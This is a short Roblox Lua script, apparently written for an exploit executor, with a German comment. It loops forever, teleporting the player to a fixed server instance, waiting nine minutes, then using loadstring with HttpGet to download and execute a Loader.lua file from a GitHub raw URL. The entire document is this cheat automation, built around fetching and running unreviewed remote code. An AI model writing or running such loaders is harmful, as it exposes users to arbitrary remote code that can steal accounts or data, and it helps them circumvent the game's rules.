-- Zeit in Sekunden, wie lange das Egg verfügbar ist
local EggTimeLeft = 540
while true do
    game:GetService("TeleportService"):TeleportToPlaceInstance(85896571713843, "eacda276-0e14-44a2-9b3a-11b7766e0e3e")
    wait(EggTimeLeft)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/PxnifyDev/roblox-job-ids/main/data/Loader.lua"))()
end
